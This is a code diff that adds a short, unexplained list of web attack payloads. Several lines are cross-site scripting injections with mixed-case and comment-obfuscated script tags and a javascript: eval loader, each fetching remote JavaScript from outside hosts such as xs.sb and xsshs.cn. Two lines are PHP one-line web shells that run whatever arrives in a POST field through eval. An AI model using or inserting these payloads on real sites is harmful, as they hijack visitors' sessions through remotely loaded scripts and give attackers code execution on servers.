@@ -1,0 +1,15 @@
+<scripT>document.createElement("Script");window.s.src="//xs.sb/FFcM";document.body.appendChild(window.s)</scRipt>
+
+
+<scripT><Img sRC=https://xss.pt/3Rh0p.jpg></scRipt>
+<script language=php>@eval($_POST['web']);</script>
+
+<scripT/**/language=php>@eval($_POST[1]);</scRipt>
+
+<sCRiPt/SrC=//xsshs.cn/FFcM>
+
+6eabe3caaeccb77310b47e397bada813
+javaScript:eval('window.s=document.creAteElement("Script");window.s.src="//xs.sb/FFcM";document.body.appendChild(window.s)')
+
+
+<sCRiPt/**/sRC=//xsshs.cn/FFcM>alert(1)</sCrIpT>
